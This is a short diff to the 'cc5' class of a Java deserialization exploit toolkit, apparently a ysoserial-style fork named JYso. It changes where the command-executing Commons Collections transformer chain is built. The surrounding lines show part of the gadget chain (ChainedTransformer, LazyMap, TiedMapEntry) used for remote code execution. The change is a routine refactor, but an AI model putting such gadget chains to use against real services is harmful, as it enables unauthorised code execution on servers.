@@ -4,7 +4,7 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.JavaVersion;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -52,7 +52,7 @@ public class cc5 implements ObjectPayload<BadAttributeValueExpException> {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Transformer[] transformers = com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
